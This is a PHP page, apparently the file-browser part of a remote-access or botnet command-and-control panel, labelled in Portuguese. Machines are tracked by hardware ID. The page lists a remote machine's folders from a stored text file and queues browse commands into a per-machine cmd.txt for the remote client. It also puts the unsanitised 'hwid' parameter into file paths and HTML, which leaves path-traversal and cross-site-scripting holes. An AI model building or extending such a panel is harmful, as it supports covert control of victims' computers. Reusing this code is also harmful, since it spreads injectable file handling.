<?php
    if (isset($_GET['flm'])) {
        $hwid = $_GET['hwid'];
        if (is_file("Users/".$hwid."/cmd.txt")) {
            $fopen = fopen("Users/".$hwid."/cmd.txt", "a");
            fwrite($fopen, "flm|".$_GET['flm']);
            fclose($fopen);
            header("location: ?hwid=".$hwid);
            die();
        }
    }
?>
<html>
    <head>
        <title></title>
    </head>
    <body>
        <?php 
            echo "<b>Você está acessando as pastas do usuário:</b> ".$_GET['hwid'];
        ?>
        <table>
                <tr>
                    <td>Nome</td>

                </tr>
                <?php 
                $hwid = $_GET['hwid'];
                if (is_dir("Users/".$hwid)) {
                    if (is_file("Users/".$hwid."/flm.txt")) {
                        $flm = file_get_contents("Users/".$hwid."/flm.txt");
                        $dadosflm = explode("|", $flm);
                        $limite = count($dadosflm);
                        for ($i = 0; $i < $limite; $i++) {
                            $fdi = explode("[:]", $dadosflm[$i]);
                ?>
                    <tr>
                        <td>
                            <a href= "http://localhost/treinamento/flm.php?hwid=<?php echo $_GET["hwid"]; ?>&flm=<?php echo $fdi[1]; ?>">
                                <?php echo $fdi[0]; ?>
                            </a>
                        </td>
                    </tr>
            <?php 
                        }
                    }
                }
            ?> 
        </table>
    </body>
</html>
